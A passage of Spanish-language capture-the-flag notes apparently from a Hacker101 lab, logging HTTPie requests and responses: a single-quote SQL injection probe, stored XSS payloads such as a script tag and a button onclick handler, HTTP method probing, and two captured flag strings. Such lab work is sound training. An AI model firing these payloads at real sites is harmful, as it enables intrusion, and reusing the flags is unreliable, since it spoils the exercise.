<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

**SQLi**

Payload: `'`

```HTTP
GET /page/edit/1' HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: 9940c6abb8ba1a5fdb4cf8e5d48cdddc.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 76
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 23:08:13 GMT
Server: openresty/1.27.1.2

^FLAG^6e95e97eb4bc6738b440562a9992f418449c11d172851a9b2323466ace0a8ccd$FLAG$
```

**Flag encontrada**

`^FLAG^6e95e97eb4bc6738b440562a9992f418449c11d172851a9b2323466ace0a8ccd$FLAG$`

**XSS**

Payload: `<form src='javascript:alert(1);'>`

Como URL encoded: `%3Cform%20src%3D%27javascript%3Aalert%281%29%3B%27%3E`

```HTTP
GET /page/edit/%3Cform%20src%3D%27javascript%3Aalert%281%29%3B%27%3E HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
User-Agent: HTTPie/3.2.4
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com



HTTP/1.1 200 OK
Date: Sun, 03 Aug 2025 16:16:16 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 76
Connection: keep-alive
Server: openresty/1.27.1.2


```

**Indento de edición de una página**
```HTTP
POST /page/edit/1 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 25
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4

title=test&body=test+body


HTTP/1.1 302 FOUND
Connection: keep-alive
Content-Length: 201
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 16:52:24 GMT
Location: /page/1
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/page/1">/page/1</a>. If not, click the link.


```

**Resultado**
```HTTP
GET /page/edit/1 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 594
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 16:53:02 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html>
    <head>
        <title>Edit page</title>
    </head>
    <body>
        <a href="../../">&lt;-- Go Home</a>
        <h1>Edit Page</h1>
        <form method="POST">
            Title: <input type="text" name="title" value="test"><br>
            <textarea name="body" rows="10" cols="80">test body</textarea><br>
            <input type="submit" value="Save">
            <div style="font-style: italic"><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown</a> is supported, but scripts are not</div>
        </form>
    </body>
</html>
```

**Parámetros vacíos**
```HTTP
POST /page/edit/1 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 12
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4

title=&body=


HTTP/1.1 302 FOUND
Connection: keep-alive
Content-Length: 201
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 16:54:13 GMT
Location: /page/1
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/page/1">/page/1</a>. If not, click the link.
```

**XSS en parámetros**

1. Payload: `<script>alert(1);</script>`
```HTTP
POST /page/edit/1 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 96
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4

title=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&body=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E


HTTP/1.1 302 FOUND
Connection: keep-alive
Content-Length: 201
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 16:54:58 GMT
Location: /page/1
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/page/1">/page/1</a>. If not, click the link.
```

**Resultado**
```HTTP
GET /page/edit/1 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 657
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 16:55:31 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html>
    <head>
        <title>Edit page</title>
    </head>
    <body>
        <a href="../../">&lt;-- Go Home</a>
        <h1>Edit Page</h1>
        <form method="POST">
            Title: <input type="text" name="title" value="&lt;script&gt;alert(1);&lt;/script&gt;"><br>
            <textarea name="body" rows="10" cols="80">&lt;script&gt;alert(1);&lt;/script&gt;</textarea><br>
            <input type="submit" value="Save">
            <div style="font-style: italic"><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown</a> is supported, but scripts are not</div>
        </form>
    </body>
</html>
```

2. Payload: `<form src='javascript:alert(1)'>`
```HTTP
POST /page/edit/1 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 65
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Host: 9940c6abb8ba1a5fdb4cf8e5d48cdddc.ctf.hacker101.com
User-Agent: HTTPie/3.2.4

title=title&body=%3Cform+src%3D%27javascript%3Aalert%281%29%27%3E


HTTP/1.1 302 FOUND
Connection: keep-alive
Content-Length: 201
Content-Type: text/html; charset=utf-8
Date: Mon, 04 Aug 2025 00:04:06 GMT
Location: /page/1
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/page/1">/page/1</a>. If not, click the link.
```

**Resultado**
```HTTP
GET /page/1 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: 9940c6abb8ba1a5fdb4cf8e5d48cdddc.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 254
Content-Type: text/html; charset=utf-8
Date: Mon, 04 Aug 2025 00:04:16 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html>
    <head>
        <title>title</title>
    </head>
    <body>
        <a href="../">&lt;-- Go Home</a><br>
        <a href="edit/1">Edit this page</a>
        <h1>title</h1>
<form src='javascrubbed:alert(1)'>
    </body>
</html>
```

3. Payload: `<button onclick=alert(1)>click</button>`
```HTTP
POST /page/edit/1 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 72
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Host: 9940c6abb8ba1a5fdb4cf8e5d48cdddc.ctf.hacker101.com
User-Agent: HTTPie/3.2.4

title=title&body=%3Cbutton+onclick%3Dalert%281%29%3Eclick%3C%2Fbutton%3E


HTTP/1.1 302 FOUND
Connection: keep-alive
Content-Length: 201
Content-Type: text/html; charset=utf-8
Date: Mon, 04 Aug 2025 00:01:50 GMT
Location: /page/1
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/page/1">/page/1</a>. If not, click the link.
```

**Resultado**
```HTTP
http -v GET "https://9940c6abb8ba1a5fdb4cf8e5d48cdddc.ctf.hacker101.com/page/1"
GET /page/1 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: 9940c6abb8ba1a5fdb4cf8e5d48cdddc.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 350
Content-Type: text/html; charset=utf-8
Date: Mon, 04 Aug 2025 00:03:09 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html>
    <head>
        <title>title</title>
    </head>
    <body>
        <a href="../">&lt;-- Go Home</a><br>
        <a href="edit/1">Edit this page</a>
        <h1>title</h1>
<p><button flag="^FLAG^0ec0cf27b597a2f5f976a7c260031e1a3f355c5dcba5bc9a012d70550f9cdd20$FLAG$" onclick=alert(1)>click</button></p>
    </body>
</html>
```

**Flag encontrada**

`^FLAG^0ec0cf27b597a2f5f976a7c260031e1a3f355c5dcba5bc9a012d70550f9cdd20$FLAG$`

**Consulta de métodos HTTP a `/page/id/edit`**
```HTTP
OPTIONS /page/7 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 200 OK
Allow: OPTIONS, HEAD, GET
Connection: keep-alive
Content-Length: 0
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 18:44:29 GMT
Server: openresty/1.27.1.2
```

**Intento de métodos no permitidos**

**Método PUT**
```HTTP
PUT /page/7 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 0
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 405 METHOD NOT ALLOWED
Allow: OPTIONS, HEAD, GET
Connection: keep-alive
Content-Length: 153
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 18:46:30 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

**Método POST**
```HTTP
POST /page/7 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 0
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 405 METHOD NOT ALLOWED
Allow: OPTIONS, HEAD, GET
Connection: keep-alive
Content-Length: 153
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 18:47:01 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

**Método DELETE**
```HTTP
DELETE /page/7 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 0
Host: c2185aa9c020ec27aed9835fe5d78864.ctf.hacker101.com
User-Agent: HTTPie/3.2.4



HTTP/1.1 405 METHOD NOT ALLOWED
Allow: OPTIONS, HEAD, GET
Connection: keep-alive
Content-Length: 153
Content-Type: text/html; charset=utf-8
Date: Sun, 03 Aug 2025 18:47:21 GMT
Server: openresty/1.27.1.2

<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```